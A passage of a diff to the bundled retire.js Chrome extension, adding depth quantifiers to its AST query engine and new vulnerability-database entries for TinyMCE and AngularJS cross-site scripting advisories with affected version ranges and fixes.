         if (!(token.value in supportedIdentifiers) && token.value != "*") {
           throw new Error("Unsupported identifier: " + token.value);
         }
-        ;
         return true;
       }
       var whitespace = " \n\r	";
@@ -9179,6 +9605,22 @@ var retirechrome = (() => {
             result.push({
               tokenType: 13
               /* FILTEREND */
+            });
+            s++;
+            continue;
+          }
+          if (input[s] == "{") {
+            result.push({
+              tokenType: 18
+              /* BRACEBEGIN */
+            });
+            s++;
+            continue;
+          }
+          if (input[s] == "}") {
+            result.push({
+              tokenType: 19
+              /* BRACEEND */
             });
             s++;
             continue;
@@ -9328,6 +9770,36 @@ var retirechrome = (() => {
         2
         /* DESCENDANT */
       ];
+      function parseDepthQuantifier(tokens) {
+        let min = 1;
+        let max;
+        let hasExplicitMin = false;
+        let after = tokens.shift();
+        if (after?.tokenType == 8 && after.value != void 0) {
+          min = parseInt(after.value, 10);
+          max = min;
+          hasExplicitMin = true;
+          after = tokens.shift();
+        }
+        if (after?.tokenType == 14) {
+          if (tokens[0]?.tokenType == 8) {
+            const maxToken = tokens.shift();
+            max = parseInt(maxToken.value, 10);
+          } else {
+            max = void 0;
+          }
+          after = tokens.shift();
+        } else if (!hasExplicitMin) {
+          throw new Error("Expected a number or ',' after '{' in depth quantifier");
+        }
+        if (after?.tokenType != 19) {
+          throw new Error("Expected '}' to close depth quantifier");
+        }
+        if (min < 1) throw new Error("Depth quantifier minimum must be at least 1");
+        if (max != void 0 && max < min)
+          throw new Error("Depth quantifier maximum must be greater than or equal to the minimum");
+        return { min, max };
+      }
       function buildTree(tokens) {
         log?.debug("BUILD TREE", tokens);
         if (tokens.length == 0) throw new Error("Unexpected end of input");
@@ -9341,9 +9813,19 @@ var retirechrome = (() => {
         }
         if (subNodes.includes(token.tokenType)) {
           let next = tokens.shift();
+          let minDepth = void 0;
+          let maxDepth = void 0;
+          if (token.tokenType == 2 && next?.tokenType == 18) {
+            const range = parseDepthQuantifier(tokens);
+            minDepth = range.min;
+            maxDepth = range.max;
+            next = tokens.shift();
+          }
           if (next?.tokenType == 17) {
+            if (minDepth != void 0) throw new Error("Depth quantifier cannot be used with a function call");
             const name = tokens.shift();
-            if (name == void 0 || name.tokenType != 0 || name.value == void 0 || typeof name.value != "string") throw new Error("Unexpected token: " + name?.tokenType + ". Expecting function name");
+            if (name == void 0 || name.tokenType != 0 || name.value == void 0 || typeof name.value != "string")
+              throw new Error("Unexpected token: " + name?.tokenType + ". Expecting function name");
             const value = name.value;
             if (!isAvailableFunction(value)) {
               throw new Error("Unsupported function: " + name.value);
@@ -9351,6 +9833,7 @@ var retirechrome = (() => {
             return buildFunctionCall(value, tokens);
           }
           if (next?.tokenType == 4) {
+            if (minDepth != void 0) throw new Error("Depth quantifier cannot be used with a parent selector");
             return { type: NodeType.PARENT, child: buildTree(tokens) };
           }
           const modifiers = [];
@@ -9371,7 +9854,8 @@ var retirechrome = (() => {
             /* RESOLVESELECTOR */
           );
           if (isResolve && isBinding2) throw new Error("Cannot have both resolve and binding");
-          if (!next || !next.value || !isAttribute && !isIdentifierToken(next)) throw new Error("Unexpected or missing token: " + next?.tokenType);
+          if (!next || !next.value || !isAttribute && !isIdentifierToken(next))
+            throw new Error("Unexpected or missing token: " + next?.tokenType);
           const identifer = next.value;
           let filter = void 0;
           if (tokens.length > 0 && tokens[0].tokenType == 12) {
@@ -9396,7 +9880,9 @@ var retirechrome = (() => {
             binding: isBinding2,
             resolve: isResolve,
             filter,
-            child
+            child,
+            minDepth,
+            maxDepth
           };
         }
         if (token.tokenType == 8) {
@@ -9445,7 +9931,7 @@ var retirechrome = (() => {
         }
       } : void 0;
       var functions = {
-        "join": {
+        join: {
           fn: (result) => {
             if (result.length != 2) throw new Error("Invalid number of arugments for join");
             const [values, separators] = result;
@@ -9456,7 +9942,7 @@ var retirechrome = (() => {
             return [values.join(separator)];
           }
         },
-        "concat": {
+        concat: {
           fn: (result) => {
             const flattened = [];
             for (let i = 0; i < result.length; i++) {
@@ -9468,14 +9954,14 @@ var retirechrome = (() => {
             return [flattened.join("")];
           }
         },
-        "first": {
+        first: {
           fn: (result) => {
             if (result.length != 1) throw new Error("Invalid number of arugments for first");
             if (result[0].length == 0) return [];
             return [result[0][0]];
           }
         },
-        "nthchild": {
+        nthchild: {
           fn: (result) => {
             if (result.length != 2) throw new Error("Invalid number of arguments for nthchild");
             if (result[1].length != 1) throw new Error("Invalid number of arguments for nthchild");
@@ -9527,6 +10013,7 @@ var retirechrome = (() => {
         function activateDescendant(fnode, state) {
           state.descendant[state.depth + 1].push(fnode);
           fnode.seq = state.seqCounter++;
+          fnode.baseDepth = state.depth;
           const value = fnode.node.value;
           if (fnode.node.attribute) {
             state.descendantOther.push(fnode);
@@ -9585,6 +10072,15 @@ var retirechrome = (() => {
           }
           return fnode;
         }
+        function descendantInDepthRange(fnode, depth) {
+          const min = fnode.node.minDepth;
+          const max = fnode.node.maxDepth;
+          if (min == void 0 && max == void 0) return true;
+          const steps = depth - fnode.baseDepth;
+          if (min != void 0 && steps < min) return false;
+          if (max != void 0 && steps > max) return false;
+          return true;
+        }
         function isMatch(fnode, node, key, parentKey) {
           if (fnode.node.attribute) {
             return fnode.node.value == parentKey || fnode.node.value == key;
@@ -9632,7 +10128,12 @@ var retirechrome = (() => {
           }
         }
         function addFunction(rootNode, functionCall, path, state) {
-          const functionNode = { node: rootNode.node, functionCall, parameters: [], result: [] };
+          const functionNode = {
+            node: rootNode.node,
+            functionCall,
+            parameters: [],
+            result: []
+          };
           for (const param of functionCall.parameters) {
             if (param.type == NodeType.LITERAL) {
               functionNode.parameters.push({ node: param, result: [param.value] });
@@ -9646,8 +10147,9 @@ var retirechrome = (() => {
           }
           return functionNode;
         }
-        function addPrimitiveAttributeIfMatch(fnode, node) {
+        function addPrimitiveAttributeIfMatch(fnode, node, depth) {
           if (!fnode.node.attribute || fnode.node.value == void 0) return;
+          if (!descendantInDepthRange(fnode, depth)) return;
           if (fnode.node.child || fnode.node.filter) return;
           if (!Object.hasOwn(node, fnode.node.value)) return;
           const nodes = getPrimitiveChildren(fnode.node.value, node);
@@ -9926,80 +10428,89 @@ var retirechrome = (() => {
           }
           const childAtDepth = state.child[state.depth + 1];
           for (let i = 0; i < childAtDepth.length; i++) {
-            addPrimitiveAttributeIfMatch(childAtDepth[i], root.node);
+            addPrimitiveAttributeIfMatch(childAtDepth[i], root.node, state.depth);
           }
           for (let i = 0; i < state.descendantAttr.length; i++) {
-            addPrimitiveAttributeIfMatch(state.descendantAttr[i], root.node);
+            addPrimitiveAttributeIfMatch(state.descendantAttr[i], root.node, state.depth);
           }
-          traverse(root.node, {
-            enter(node, key, parentKey, materialize, state2) {
-              state2.depth++;
-              state2.child.push([]);
-              state2.descendant.push([]);
-              state2.filtersMap.push(void 0);
-              state2.matches.push([]);
-              state2.functionCalls.push([]);
-              const depth = state2.depth;
-              let path;
-              const childAtDepth2 = state2.child[depth];
-              for (let i = 0; i < childAtDepth2.length; i++) {
-                const fnode = childAtDepth2[i];
-                if (isMatch(fnode, node, key, parentKey)) {
-                  addMatch(fnode, path ?? (path = materialize(depth)), state2);
-                }
-              }
-              const bucket = state2.descendantByType.get(node.type);
-              const other = state2.descendantOther;
-              const bucketLen = bucket ? bucket.length : 0;
-              const otherLen = other.length;
-              if (otherLen == 0) {
-                for (let i = 0; i < bucketLen; i++) {
-                  addMatch(bucket[i], path ?? (path = materialize(depth)), state2);
-                }
-              } else if (bucketLen == 0) {
-                for (let i = 0; i < otherLen; i++) {
-                  const fnode = other[i];
+          traverse(
+            root.node,
+            {
+              enter(node, key, parentKey, materialize, state2) {
+                state2.depth++;
+                state2.child.push([]);
+                state2.descendant.push([]);
+                state2.filtersMap.push(void 0);
+                state2.matches.push([]);
+                state2.functionCalls.push([]);
+                const depth = state2.depth;
+                let path;
+                const childAtDepth2 = state2.child[depth];
+                for (let i = 0; i < childAtDepth2.length; i++) {
+                  const fnode = childAtDepth2[i];
                   if (isMatch(fnode, node, key, parentKey)) {
                     addMatch(fnode, path ?? (path = materialize(depth)), state2);
                   }
                 }
-              } else {
-                const cands = [];
-                for (let i = 0; i < bucketLen; i++) cands.push(bucket[i]);
-                for (let i = 0; i < otherLen; i++) cands.push(other[i]);
-                cands.sort((a, b) => a.seq - b.seq);
-                for (let i = 0; i < cands.length; i++) {
-                  const fnode = cands[i];
-                  if (isMatch(fnode, node, key, parentKey)) {
-                    addMatch(fnode, path ?? (path = materialize(depth)), state2);
+                const bucket = state2.descendantByType.get(node.type);
+                const other = state2.descendantOther;
+                const bucketLen = bucket ? bucket.length : 0;
+                const otherLen = other.length;
+                if (otherLen == 0) {
+                  for (let i = 0; i < bucketLen; i++) {
+                    const fnode = bucket[i];
+                    if (descendantInDepthRange(fnode, depth)) {
+                      addMatch(fnode, path ?? (path = materialize(depth)), state2);
+                    }
+                  }
+                } else if (bucketLen == 0) {
+                  for (let i = 0; i < otherLen; i++) {
+                    const fnode = other[i];
+                    if (isMatch(fnode, node, key, parentKey) && descendantInDepthRange(fnode, depth)) {
+                      addMatch(fnode, path ?? (path = materialize(depth)), state2);
+                    }
+                  }
+                } else {
+                  const cands = [];
+                  for (let i = 0; i < bucketLen; i++) cands.push(bucket[i]);
+                  for (let i = 0; i < otherLen; i++) cands.push(other[i]);
+                  cands.sort((a, b) => a.seq - b.seq);
+                  for (let i = 0; i < cands.length; i++) {
+                    const fnode = cands[i];
+                    if (isMatch(fnode, node, key, parentKey) && descendantInDepthRange(fnode, depth)) {
+                      addMatch(fnode, path ?? (path = materialize(depth)), state2);
+                    }
                   }
                 }
+              },
+              exit(node, state2) {
+                const childAtDepthPlusOne = state2.child[state2.depth + 1];
+                for (let i = 0; i < childAtDepthPlusOne.length; i++) {
+                  addPrimitiveAttributeIfMatch(childAtDepthPlusOne[i], node, state2.depth);
+                }
+                for (let i = 0; i < state2.descendantAttr.length; i++) {
+                  addPrimitiveAttributeIfMatch(state2.descendantAttr[i], node, state2.depth);
+                }
+                const matchesAtDepth = state2.matches[state2.depth];
+                for (let i = 0; i < matchesAtDepth.length; i++) {
+                  addResultIfTokenMatch(matchesAtDepth[i][0], matchesAtDepth[i][1], state2);
+                }
+                const leavingDescendants = state2.descendant[state2.descendant.length - 1];
+                for (let i = 0; i < leavingDescendants.length; i++) {
+                  deactivateDescendant(leavingDescendants[i], state2);
+                }
+                state2.depth--;
+                state2.child.pop();
+                state2.descendant.pop();
+                state2.filtersMap.pop();
+                state2.matches.pop();
+                state2.functionCalls.pop();
               }
             },
-            exit(node, state2) {
-              const childAtDepthPlusOne = state2.child[state2.depth + 1];
-              for (let i = 0; i < childAtDepthPlusOne.length; i++) {
-                addPrimitiveAttributeIfMatch(childAtDepthPlusOne[i], node);
-              }
-              for (let i = 0; i < state2.descendantAttr.length; i++) {
-                addPrimitiveAttributeIfMatch(state2.descendantAttr[i], node);
-              }
-              const matchesAtDepth = state2.matches[state2.depth];
-              for (let i = 0; i < matchesAtDepth.length; i++) {
-                addResultIfTokenMatch(matchesAtDepth[i][0], matchesAtDepth[i][1], state2);
-              }
-              const leavingDescendants = state2.descendant[state2.descendant.length - 1];
-              for (let i = 0; i < leavingDescendants.length; i++) {
-                deactivateDescendant(leavingDescendants[i], state2);
-              }
-              state2.depth--;
-              state2.child.pop();
-              state2.descendant.pop();
-              state2.filtersMap.pop();
-              state2.matches.pop();
-              state2.functionCalls.pop();
-            }
-          }, root.scopeId, state, root);
+            root.scopeId,
+            state,
+            root
+          );
           return results;
         }
         function beginHandle(queries, path) {
@@ -10125,6 +10636,10 @@ var retirechrome = (() => {
             }
             return result;
           }
+          if (key === "value") {
+            const templateValue = staticTemplateLiteralValue(node);
+            if (templateValue != void 0) return [templateValue];
+          }
           return [];
         }
         function getPrimitiveChildrenOrNodePaths(key, path) {
@@ -10139,10 +10654,12 @@ var retirechrome = (() => {
               }
               return result;
             } else if (r != void 0) {
-              return [
-                isPrimitive(r) ? r : createNodePath(r, key, key, path.scopeId, path.functionScopeId, path)
-              ];
+              return [isPrimitive(r) ? r : createNodePath(r, key, key, path.scopeId, path.functionScopeId, path)];
             }
+          }
+          if (key === "value") {
+            const templateValue = staticTemplateLiteralValue(path.node);
+            if (templateValue != void 0) return [templateValue];
           }
           return [];
         }
@@ -10184,19 +10701,26 @@ var retirechrome = (() => {
           const node = stack[stack.length - 1];
           if (!isIdentifier(node)) return;
           const parentNode = stack[stack.length - 2];
-          if (isAssignmentExpression(parentNode) || isMemberExpression(parentNode) || isUpdateExpression(parentNode) || isExportSpecifier(parentNode)) return;
+          if (isAssignmentExpression(parentNode) || isMemberExpression(parentNode) || isUpdateExpression(parentNode) || isExportSpecifier(parentNode))
+            return;
           const grandParentNode = stack[stack.length - 3];
           if (!isBinding(node, parentNode, grandParentNode)) return;
           if (key == "id" && !isVariableDeclarator(parentNode)) {
-            setBinding(functionScopeId, node.name, { path: createNodePath(node, void 0, void 0, scopeId, functionScopeId) });
+            setBinding(functionScopeId, node.name, {
+              path: createNodePath(node, void 0, void 0, scopeId, functionScopeId)
+            });
             return;
           }
           if (isVariableDeclarator(parentNode) && isVariableDeclaration(grandParentNode)) {
             if (grandParentNode.kind == "var") {
-              setBinding(functionScopeId, node.name, { path: createNodePath(parentNode, void 0, void 0, scopeId, functionScopeId) });
+              setBinding(functionScopeId, node.name, {
+                path: createNodePath(parentNode, void 0, void 0, scopeId, functionScopeId)
+              });
               return;
             } else {
-              setBinding(scopeId, node.name, { path: createNodePath(parentNode, void 0, void 0, scopeId, functionScopeId) });
+              setBinding(scopeId, node.name, {
+                path: createNodePath(parentNode, void 0, void 0, scopeId, functionScopeId)
+              });
               return;
             }
           }
@@ -10316,7 +10840,15 @@ var retirechrome = (() => {
           }
           traverseInner(node, 0);
           if (debugLogEnabled2 && !sOut.includes(scopeIdCounter)) {
-            log2?.debug("Scopes created", scopeIdCounter, " Scopes removed", removedScopes, "Paths created", pathsCreated, bindingNodesVisited);
+            log2?.debug(
+              "Scopes created",
+              scopeIdCounter,
+              " Scopes removed",
+              removedScopes,
+              "Paths created",
+              pathsCreated,
+              bindingNodesVisited
+            );
             sOut.push(scopeIdCounter);
             const k = Object.fromEntries(Object.entries(nodePathsCreated).sort((a, b) => a[1] - b[1]));
             log2?.debug("Node paths created", k);
@@ -12658,6 +13190,69 @@ Upgrade to version 1.9.0 or later.`,
               },
               {
                 atOrAbove: "0",
+                below: "5.10.10",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability using through data-mce- prefixed src, href, style attributes",
+                  githubID: "GHSA-q742-qvgc-gc2f",
+                  CVE: [
+                    "CVE-2026-47759"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability via unsanitized data-mce-* attributes (data-mce-href, data-mce-src, data-mce-style). Allows attackers to inject malicious values that override safe attributes during serialization, bypassing validation.\n\n### Patches\nPatched by stripping unsafe data-mce-* attributes during parsing. Users should upgrade to the latest patched versions (5 LTS, 7.x, 8.x).\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.5.1 or higher.\nUpgrade to TinyMCE 7.9.3 or higher.\nUpgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Tadi Kadango](https://github.com/mtrill47) ([website](https://tadiwakadango.com/))  and [Ivan Babenko](https://github.com/he1d3n) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-q742-qvgc-gc2f",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "5.10.10",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability through `mce:protected` comments",
+                  githubID: "GHSA-v98h-vmpc-fpqv",
+                  CVE: [
+                    "CVE-2026-47762"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability via forged mce:protected comments. Allows attackers to bypass sanitization and inject scripts that execute when content is restored. Impacts users who utilize the protect option.\n\n### Patches\nPatched by validating decoded mce:protected content against configured protect regex rules before restoring. Users should upgrade to the latest patched version.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.5.1 or higher.\nUpgrade to TinyMCE 7.9.3 or higher.\nUpgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Ivan Babenko](https://github.com/he1d3n) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-v98h-vmpc-fpqv",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "5.10.10",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` injection",
+                  githubID: "GHSA-vg35-5wq7-3x7w",
+                  CVE: [
+                    "CVE-2026-47761"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via crafted `data-mce-*` attributes, which are executed when content is rendered. Impacts users of TinyMCE with the media plugin enabled.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 8.5.1, TinyMCE 7.9.3 and TinyMCE 5.11.1 LTS by ensuring that, when using the media plugin, any content with `data-mce-object` and `data-mce-p-*` attributes are properly sanitized.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\n- Upgrade to TinyMCE 8.5.1 or higher.\n- Upgrade to TinyMCE 7.9.3 or higher.\n- Upgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Aymane MAZGUITI](https://github.com/UncleJ4ck) and [Ange Primiterra](https://github.com/ange-primiterra) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-vg35-5wq7-3x7w",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "0",
                 below: "5.11.0",
                 cwe: [
                   "CWE-79"
@@ -12894,6 +13489,25 @@ Upgrade to version 1.9.0 or later.`,
                 ]
               },
               {
+                atOrAbove: "6.8.0",
+                below: "7.1.0",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability using sanitization bypass through nested SVGs",
+                  githubID: "GHSA-mh5m-5hw4-5c69",
+                  CVE: [
+                    "CVE-2026-47760"
+                  ]
+                },
+                details: "### Impact\nTinyMCE 6.8.x contains an XSS vulnerability caused by improper SVG namespace scope handling in the sanitizer. A crafted payload using nested <svg> elements can bypass attribute sanitization and execute arbitrary JavaScript.\n\n### Patches\nThis issue affects TinyMCE 6.8.x-7.0.x. The vulnerability is fixed in TinyMCE 7.1.0 and later.\n\n### Workarounds\nNo official workaround available.\n\n### Acknowledgements\nTiny thanks [maple3142](https://github.com/maple3142) (<https://maple3142.net>) of DEVCORE for their help identifying this vulnerability.\n\n### References\nFix introduced in TinyMCE 7.1.0 though a rewrite of code causing the vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-mh5m-5hw4-5c69"
+                ]
+              },
+              {
                 atOrAbove: "7.0.0",
                 below: "7.2.0",
                 cwe: [
@@ -12944,6 +13558,132 @@ Upgrade to version 1.9.0 or later.`,
                   "https://owasp.org/www-community/attacks/xss",
                   "https://www.tiny.cloud/docs/tinymce/6/6.8.4-release-notes/#overview",
                   "https://www.tiny.cloud/docs/tinymce/7/7.2-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "6.0.0",
+                below: "7.9.3",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability using through data-mce- prefixed src, href, style attributes",
+                  githubID: "GHSA-q742-qvgc-gc2f",
+                  CVE: [
+                    "CVE-2026-47759"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability via unsanitized data-mce-* attributes (data-mce-href, data-mce-src, data-mce-style). Allows attackers to inject malicious values that override safe attributes during serialization, bypassing validation.\n\n### Patches\nPatched by stripping unsafe data-mce-* attributes during parsing. Users should upgrade to the latest patched versions (5 LTS, 7.x, 8.x).\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.5.1 or higher.\nUpgrade to TinyMCE 7.9.3 or higher.\nUpgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Tadi Kadango](https://github.com/mtrill47) ([website](https://tadiwakadango.com/))  and [Ivan Babenko](https://github.com/he1d3n) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-q742-qvgc-gc2f",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "6.0.0",
+                below: "7.9.3",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability through `mce:protected` comments",
+                  githubID: "GHSA-v98h-vmpc-fpqv",
+                  CVE: [
+                    "CVE-2026-47762"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability via forged mce:protected comments. Allows attackers to bypass sanitization and inject scripts that execute when content is restored. Impacts users who utilize the protect option.\n\n### Patches\nPatched by validating decoded mce:protected content against configured protect regex rules before restoring. Users should upgrade to the latest patched version.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.5.1 or higher.\nUpgrade to TinyMCE 7.9.3 or higher.\nUpgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Ivan Babenko](https://github.com/he1d3n) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-v98h-vmpc-fpqv",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "6.0.0",
+                below: "7.9.3",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` injection",
+                  githubID: "GHSA-vg35-5wq7-3x7w",
+                  CVE: [
+                    "CVE-2026-47761"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via crafted `data-mce-*` attributes, which are executed when content is rendered. Impacts users of TinyMCE with the media plugin enabled.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 8.5.1, TinyMCE 7.9.3 and TinyMCE 5.11.1 LTS by ensuring that, when using the media plugin, any content with `data-mce-object` and `data-mce-p-*` attributes are properly sanitized.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\n- Upgrade to TinyMCE 8.5.1 or higher.\n- Upgrade to TinyMCE 7.9.3 or higher.\n- Upgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Aymane MAZGUITI](https://github.com/UncleJ4ck) and [Ange Primiterra](https://github.com/ange-primiterra) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-vg35-5wq7-3x7w",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "8.0.0",
+                below: "8.5.1",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability using through data-mce- prefixed src, href, style attributes",
+                  githubID: "GHSA-q742-qvgc-gc2f",
+                  CVE: [
+                    "CVE-2026-47759"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability via unsanitized data-mce-* attributes (data-mce-href, data-mce-src, data-mce-style). Allows attackers to inject malicious values that override safe attributes during serialization, bypassing validation.\n\n### Patches\nPatched by stripping unsafe data-mce-* attributes during parsing. Users should upgrade to the latest patched versions (5 LTS, 7.x, 8.x).\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.5.1 or higher.\nUpgrade to TinyMCE 7.9.3 or higher.\nUpgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Tadi Kadango](https://github.com/mtrill47) ([website](https://tadiwakadango.com/))  and [Ivan Babenko](https://github.com/he1d3n) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-q742-qvgc-gc2f",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "8.0.0",
+                below: "8.5.1",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability through `mce:protected` comments",
+                  githubID: "GHSA-v98h-vmpc-fpqv",
+                  CVE: [
+                    "CVE-2026-47762"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability via forged mce:protected comments. Allows attackers to bypass sanitization and inject scripts that execute when content is restored. Impacts users who utilize the protect option.\n\n### Patches\nPatched by validating decoded mce:protected content against configured protect regex rules before restoring. Users should upgrade to the latest patched version.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.5.1 or higher.\nUpgrade to TinyMCE 7.9.3 or higher.\nUpgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Ivan Babenko](https://github.com/he1d3n) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-v98h-vmpc-fpqv",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+                ]
+              },
+              {
+                atOrAbove: "8.0.0",
+                below: "8.5.1",
+                severity: "high",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` injection",
+                  githubID: "GHSA-vg35-5wq7-3x7w",
+                  CVE: [
+                    "CVE-2026-47761"
+                  ]
+                },
+                details: "### Impact\nStored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via crafted `data-mce-*` attributes, which are executed when content is rendered. Impacts users of TinyMCE with the media plugin enabled.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 8.5.1, TinyMCE 7.9.3 and TinyMCE 5.11.1 LTS by ensuring that, when using the media plugin, any content with `data-mce-object` and `data-mce-p-*` attributes are properly sanitized.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\n- Upgrade to TinyMCE 8.5.1 or higher.\n- Upgrade to TinyMCE 7.9.3 or higher.\n- Upgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial [long-term support](https://www.tiny.cloud/long-term-support/) contract).\n\n### Acknowledgements\nTiny thanks [Aymane MAZGUITI](https://github.com/UncleJ4ck) and [Ange Primiterra](https://github.com/ange-primiterra) for their help identifying this vulnerability.",
+                info: [
+                  "https://github.com/tinymce/tinymce/security/advisories/GHSA-vg35-5wq7-3x7w",
+                  "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
+                  "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
                 ]
               }
             ],
@@ -14394,6 +15134,31 @@ Upgrade to version 1.9.0 or later.`,
                 ]
               },
               {
+                atOrAbove: "1.2.0-rc.3",
+                below: "1.8.4",
+                severity: "high",
+                cwe: [
+                  "CWE-79",
+                  "CWE-791"
+                ],
+                identifiers: {
+                  summary: "Angular's deprecated package has a Cross-Site Scripting issue",
+                  githubID: "GHSA-7x27-g8rg-x87w",
+                  CVE: [
+                    "CVE-2026-11998"
+                  ]
+                },
